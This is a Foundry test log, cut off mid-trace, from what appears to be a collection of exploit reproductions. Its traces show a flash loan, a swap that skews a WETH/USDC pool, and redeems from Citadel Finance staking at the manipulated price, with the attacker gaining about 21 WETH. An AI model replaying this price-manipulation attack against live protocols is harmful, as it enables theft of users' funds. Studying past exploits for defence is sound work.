Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.48s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-01/CitadelFinance_exp.sol:67:5:
   |
67 |     IERC20 private constant WETH =
   |     ^ (Relevant source part starts here and spans across multiple lines).
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-01/CitadelFinance_exp.sol:69:5:
   |
69 |     IERC20 private constant USDC =
   |     ^ (Relevant source part starts here and spans across multiple lines).
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 474.89ms (109.46Вµs CPU time)

Ran 1 test for src/test/2024-01/CitadelFinance_exp.sol:ContractTest
[PASS] testExploit() (gas: 782440)
Logs:
  Exploiter total staked CIT amount (minus fee) before attack: 2599.940000000000000000
  Exploiter WETH balance before attack: 0.000000000000000000
  --------------------Start attack--------------------
  Flashloaned amount of WETH to swap and manipulate WETH/USDC pair: 4500.000000000000000000
  Available amount of CIT to redeem: 92.855000000000000000
  Available amount of CIT to redeem in USDC: 371420000
  --------------------End attack--------------------
  Exploiter WETH balance after attack: 21.327628237750659425

Traces:
  [983316] ContractTest::testExploit()
    в”њв”Ђ [2623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] VM::record()
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] VM::accesses(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81])
    в”‚   в””в”Ђ в†ђ [Return] [0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03], []
    в”њв”Ђ [0] VM::load(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”њв”Ђ emit WARNING_UninitedSlot(who: CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
    в”њв”Ђ [0] VM::load(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”њв”Ђ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] VM::store(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    в”њв”Ђ [0] VM::store(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x0000000000000000000000000000000000000000000000000000000000000000)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit SlotFound(who: CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 43395567998282996429510105732813622026225105309595388710023329053794126379779 [4.339e76])
    в”њв”Ђ [0] VM::load(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”њв”Ђ [0] VM::store(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, 0x00000000000000000000000000000000000000000000008fd1c563cdb7540000)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 2653000000000000000000 [2.653e21]
    в”њв”Ђ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 2653000000000000000000 [2.653e21]
    в”њв”Ђ [24801] CIT::approve(CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], 2653000000000000000000 [2.653e21])
    в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], value: 2653000000000000000000 [2.653e21])
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [623] CIT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 2653000000000000000000 [2.653e21]
    в”њв”Ђ [239191] CitadelStaking::deposit(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 2653000000000000000000 [2.653e21], 1)
    в”‚   в”њв”Ђ [2612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”њв”Ђ [30257] CIT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], 2653000000000000000000 [2.653e21])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], value: 2653000000000000000000 [2.653e21])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [6428] CIT::transfer(CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], 53060000000000000000 [5.306e19])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: CitadelStaking: [0x5e93c07a22111b327EE0EaEC64028064448ae848], to: CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81], value: 53060000000000000000 [5.306e19])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [1030] CitadelStaking::getTotalTokenStakedForUser(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, CIT: [0x43cF1856606df2CB22AEdbA1a3e23725f1594E81]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 2599940000000000000000 [2.599e21]
    в”њв”Ђ [267] CIT::decimals() [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Exploiter total staked CIT amount (minus fee) before attack", val: 2599940000000000000000 [2.599e21], decimals: 18)
    в”њв”Ђ [9796] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [267] CIT::decimals() [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Exploiter WETH balance before attack", val: 0, decimals: 18)
    в”њв”Ђ [0] VM::roll(174662726 [1.746e8])
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [0] VM::warp(1706347536 [1.706e9])
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_string(val: "--------------------Start attack--------------------")
    в”њв”Ђ [459293] WETH_USDC::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4500000000000000000000 [4.5e21], 0, 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000)
    в”‚   в”њв”Ђ [3296] WETH::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4951075593957827651289 [4.951e21]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 4951075593957827651289 [4.951e21]
    в”‚   в”њв”Ђ [9796] USDC::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376827407693 [1.137e13]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376827407693 [1.137e13]
    в”‚   в”њв”Ђ [26900] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4500000000000000000000 [4.5e21])
    в”‚   в”‚   в”њв”Ђ [26154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4500000000000000000000 [4.5e21]) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4500000000000000000000 [4.5e21])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [392017] ContractTest::uniswapV3FlashCallback(2250000000000000000 [2.25e18], 0, 0x0000000000000000000000000000000000000000000000f3f20b8dfa69d00000)
    в”‚   в”‚   в”њв”Ђ [25308] WETH::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 4500000000000000000000 [4.5e21])
    в”‚   в”‚   в”‚   в”њв”Ђ [24562] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 4500000000000000000000 [4.5e21]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 4500000000000000000000 [4.5e21])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [3076] WETH::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2336] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::decimals() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "Flashloaned amount of WETH to swap and manipulate WETH/USDC pair", val: 4500000000000000000000 [4.5e21], decimals: 18)
    в”‚   в”‚   в”њв”Ђ [94739] CamelotRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(4500000000000000000000 [4.5e21], 0, [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1706348536 [1.706e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [11680] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 4500000000000000000000 [4.5e21])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10928] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 4500000000000000000000 [4.5e21]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 4500000000000000000000 [4.5e21])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [3296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [2529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 220596413000945024289 [2.205e20], 497811843383 [4.978e11], 300
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21]
    в”‚   в”‚   в”‚   в”њв”Ђ [5716] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(4500000000000000000000 [4.5e21], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000006e7955c5fe
    в”‚   в”‚   в”‚   в”њв”Ђ [59529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(0, 474482066942 [4.744e11], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [35397] USDC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 474482066942 [4.744e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [34651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 474482066942 [4.744e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 474482066942 [4.744e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23329776441 [2.332e10]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23329776441 [2.332e10]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4720596413000945024289 [4.72e21]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 4720596413000945024289 [4.72e21], reserve1: 23329776441 [2.332e10])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 4500000000000000000000 [4.5e21], amount1In: 0, amount0Out: 0, amount1Out: 474482066942 [4.744e11], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 474482066942 [4.744e11]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 474482066942 [4.744e11]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3296] WETH::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 72668070516983737917 [7.266e19]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 72668070516983737917 [7.266e19]
    в”‚   в”‚   в”њв”Ђ [4412] CamelotRouter::getAmountsOut(72668070516983737917 [7.266e19], [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1716] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(72668070516983737917 [7.266e19], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000001504ef82
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [72668070516983737917 [7.266e19], 352644994 [3.526e8]]
    в”‚   в”‚   в”њв”Ђ [7783] CitadelStaking::redeemCalculator(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [[0, 92855000000000000000 [9.285e19]], [0, 0]]
    в”‚   в”‚   в”њв”Ђ [5783] CitadelStaking::redeemCalculator(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [[0, 92855000000000000000 [9.285e19]], [0, 0]]
    в”‚   в”‚   в”њв”Ђ [267] CIT::decimals() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "Available amount of CIT to redeem", val: 92855000000000000000 [9.285e19], decimals: 18)
    в”‚   в”‚   в”њв”Ђ [12192] CitadelStaking::getCITInUSDAllFixedRates(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 92855000000000000000 [9.285e19]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 371420000000000000000 [3.714e20]
    в”‚   в”‚   в”њв”Ђ emit log_named_uint(key: "Available amount of CIT to redeem in USDC", val: 371420000 [3.714e8])
    в”‚   в”‚   в”њв”Ђ [132236] CitadelRedeem::redeem(1, 0, 30951666666666666666 [3.095e19], 1)
    в”‚   в”‚   в”‚   в”њв”Ђ [5783] CitadelStaking::redeemCalculator(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [[0, 92855000000000000000 [9.285e19]], [0, 0]]
    в”‚   в”‚   в”‚   в”њв”Ђ [12192] CitadelStaking::getCITInUSDAllFixedRates(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30951666666666666666 [3.095e19]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [612] 0xCaF5460bEbB5631F925251DB95e539B761A305fD::getReferrer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 123806666666666666664 [1.238e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [4442] CamelotRouter::getAmountsOut(123806666 [1.238e8], [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1736] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(123806666 [1.238e8], USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
